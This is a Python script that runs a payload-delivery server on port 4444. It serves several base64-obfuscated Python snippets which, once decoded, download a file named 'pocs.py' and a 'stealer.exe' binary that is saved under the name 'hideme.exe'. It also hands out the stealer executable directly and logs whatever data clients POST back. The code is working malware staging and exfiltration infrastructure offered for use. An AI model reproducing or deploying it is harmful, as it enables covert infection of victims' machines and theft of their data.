#!/usr/bin/env python3

from http.server import BaseHTTPRequestHandler, HTTPServer
import logging,json
from itsdangerous import base64_encode
import os
import shutil
import sys
def t1(list,r):
    t = list
    while r < 20: 
        t = base64_encode(t)
        t =t
        r+=1
    return t

cmd_lst = []
cmd1 = 'STJWNFpXTjFkR2x2Ymdwd2NtbHVkQ2duZVc5MUlIZGxjbVVnYUdGamEyVmtKeWtL'
cmd2 = "I2V4ZWN1dGlvbgppbXBvcnQgcmVxdWVzdHMKdCA9IHJlcXVlc3RzLmdldCgiaHR0cDovL2xvY2FsaG9zdDo0NDQ0L3BvY3MucHkiKQp3aXRoIG9wZW4oJ2NvcGllZHBvY3MucHknLCd3YicpIGFzIHJwOiBycC53cml0ZSh0LmNvbnRlbnQp"
cmd3 = 'I2V4ZWN1dGlvbgppbXBvcnQgcmVxdWVzdHMKdCA9IHJlcXVlc3RzLmdldCgiaHR0cDovL2xvY2FsaG9zdDo0NDQ0L3N0ZWFsZXIuZXhlIikKd2l0aCBvcGVuKCdoaWRlbWUuZXhlJywnd2InKSBhcyByOiByLndyaXRlKHQuY29udGVudCk='
cmd4 = ''


#print('{} {} {} {}'.format(t1(cmd1),cmd2,cmd3,cmd4))
#exec(base64_decode(t1(cmd1)))

#print(t2(cmd1))
cmd1_ = str(t1(cmd1,3)).strip('b').strip('\'')
cmd2_ = str(t1(cmd2,6)).strip('b').strip('\'')
cmd3_ = str(t1(cmd3,3)).strip('b').strip('\'')
class vic(BaseHTTPRequestHandler):
  

    def do_GET(self):

        if self.path.endswith("/stealer.exe"):
            FILEPATH = 'stealer.exe'
            with open(FILEPATH, 'rb') as f:
                self.send_response(200)
                self.send_header("Content-Type", 'application/octet-stream')
                self.send_header("Content-Disposition", 'attachment; filename="{}"'.format(os.path.basename(FILEPATH)))
                fs = os.fstat(f.fileno())
                self.send_header("Content-Length", str(fs.st_size))
                self.end_headers()
                shutil.copyfileobj(f, self.wfile)
            return
        
        elif self.path.endswith("/"):
            logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
            #self._set_response()
            json_data = {'t1': cmd1_,'t2':cmd2_,'t3':cmd3_}
            json_to_pass = json.dumps(json_data)
            self.send_response(code=200)
            self.send_header(keyword='Content-type', value='application/json')
            self.end_headers()
            self.wfile.write(json_to_pass.encode('utf-8'))

        #self.wfile.write("GET request for {}".format(self.path).encode('utf-8'))
        else:
            self.send_error(404, 'File Not Found: %s' % self.path)

    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
                str(self.path), str(self.headers), post_data.decode('utf-8'))

        self._set_response()
        self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))

def run(server_class=HTTPServer, handler_class=vic, port=4444):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run(port=4444)